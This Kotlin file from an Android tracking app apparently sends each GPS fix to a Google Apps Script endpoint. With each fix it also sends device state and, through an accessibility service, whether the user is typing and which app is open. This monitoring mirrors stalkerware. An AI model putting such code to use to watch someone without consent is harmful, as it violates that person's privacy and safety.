package com.Dev.where.tracker

import android.content.Context
import android.location.Location
import android.util.Log
import com.Dev.where.db.GpsPoint
import com.Dev.where.db.WhereDatabase
import com.Dev.where.tracker.TypingAccessibilityService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

object SheetsSender {

    private const val TAG = "SheetsSender"
    private const val ENDPOINT = "https://script.google.com/macros/s/AKfycbxbIfCAjoLvRZAFuvb0QQ9GUx-Ugoje24qArFoA9z7lXTaWYKUDNFfma--IxQzg69Lmdw/exec"



    // DOPO
    private val client = OkHttpClient.Builder()
        .followRedirects(false)
        .followSslRedirects(false)
        .addInterceptor { chain ->
            var response = chain.proceed(chain.request())
            if (response.code == 302 || response.code == 301) {
                val newUrl = response.header("Location") ?: return@addInterceptor response
                response.close()
                val newRequest = chain.request().newBuilder()
                    .url(newUrl)
                    .post(chain.request().body!!)
                    .build()
                response = chain.proceed(newRequest)
            }
            response
        }
        .build()
    private val JSON_TYPE = "application/json".toMediaType()
    private val scope = CoroutineScope(Dispatchers.IO)

    fun saveAndSend(context: Context, location: Location, satellites: Int) {
        scope.launch {
            val dao = WhereDatabase.getInstance(context).gpsPointDao()
            val id = dao.insert(
                GpsPoint(
                    lat = location.latitude,
                    lng = location.longitude,
                    accuracy = location.accuracy,
                    timestamp = location.time
                )
            )
            Log.d(TAG, "Salvato su Room → id=$id")
            sendPoint(context, id, location, satellites)
        }
    }

    fun retrySend(context: Context) {
        scope.launch {
            val dao = WhereDatabase.getInstance(context).gpsPointDao()
            val pending = dao.getPending()
            Log.d(TAG, "Retry: ${pending.size} punti pending")
            pending.forEach { point ->
                val fakeLocation = Location("retry").apply {
                    latitude = point.lat
                    longitude = point.lng
                    accuracy = point.accuracy
                    time = point.timestamp
                }
                sendPoint(context, point.id, fakeLocation, 0)
            }
        }
    }

    private fun sendPoint(context: Context, id: Long, location: Location, satellites: Int) {
        val deviceId = DeviceInfo.getDeviceId(context)
        val deviceName = DeviceInfo.getDeviceName()
        val battery = DeviceInfo.getBatteryLevel(context)
        val isCharging = DeviceInfo.isCharging(context)
        val isOnCall = DeviceInfo.isOnCall(context)
        val isScreenOn = DeviceInfo.isScreenOn(context)
        val networkType = DeviceInfo.getNetworkType(context)
        val isTyping = TypingAccessibilityService.checkAndResetTyping()
        val activeApp = TypingAccessibilityService.activeApp

        val body = """
            {
              "deviceId": "$deviceId",
              "deviceName": "$deviceName",
              "lat": ${location.latitude},
              "lng": ${location.longitude},
              "accuracy": ${location.accuracy},
              "speed": ${location.speed},
              "altitude": ${location.altitude},
              "bearing": ${location.bearing},
              "satellites": $satellites,
              "battery": $battery,
              "isCharging": $isCharging,
              "isOnCall": $isOnCall,
              "isScreenOn": $isScreenOn,
              "networkType": "$networkType",
              "isTyping": $isTyping,
              "activeApp": "$activeApp",
              "timestamp": "${java.util.Date(location.time).toInstant()}"
            }
        """.trimIndent()

        val request = Request.Builder()
            .url(ENDPOINT)
            .post(body.toRequestBody(JSON_TYPE))
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "POST fallito id=$id: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                val responseBody = response.body?.string()
                Log.d(TAG, "POST ok id=$id: $responseBody")
                response.close()
                if (responseBody?.contains("\"ok\"") == true) {
                    scope.launch {
                        val dao = WhereDatabase.getInstance(context).gpsPointDao()
                        dao.markSent(id)
                    }
                }
            }
        })
    }
}